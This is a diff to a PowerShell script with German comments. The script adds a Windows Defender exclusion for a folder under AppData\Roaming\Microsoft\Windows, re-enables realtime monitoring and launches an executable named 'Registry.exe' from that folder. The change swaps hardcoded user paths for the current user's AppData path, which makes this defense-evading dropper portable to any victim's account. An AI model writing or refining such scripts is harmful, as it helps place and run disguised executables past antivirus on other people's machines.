@@ -51,8 +51,8 @@ if (-not $foundFilePath) {
     exit
 }
 
-# 4. Zielordner definieren
-$zielOrdner = "C:\Users\benutzer\AppData\Roaming\Microsoft\Windows"
+# 4. Zielordner dynamisch bestimmen (aktueller Benutzer)
+$zielOrdner = Join-Path $env:APPDATA "Microsoft\Windows"
 if (-not (Test-Path $zielOrdner)) {
     Write-Host "Zielordner $zielOrdner existiert nicht, wird erstellt..."
     New-Item -Path $zielOrdner -ItemType Directory -Force
@@ -71,8 +71,8 @@ Add-MpPreference -ExclusionPath $zielOrdner
 Write-Host "Aktiviere Windows Defender wieder..."
 Set-MpPreference -DisableRealtimeMonitoring $false
 
-# 8. Datei ausführen (zweiter Pfad)
-$ausfuehrPfad = "C:\Users\fusse\AppData\Roaming\Microsoft\Windows\Registry.exe"
+# 8. Datei ausführen (ebenfalls dynamisch aus dem AppData-Pfad)
+$ausfuehrPfad = Join-Path $env:APPDATA "Microsoft\Windows\Registry.exe"
 if (Test-Path $ausfuehrPfad) {
     Write-Host "Starte Datei $ausfuehrPfad"
     Start-Process -FilePath $ausfuehrPfad
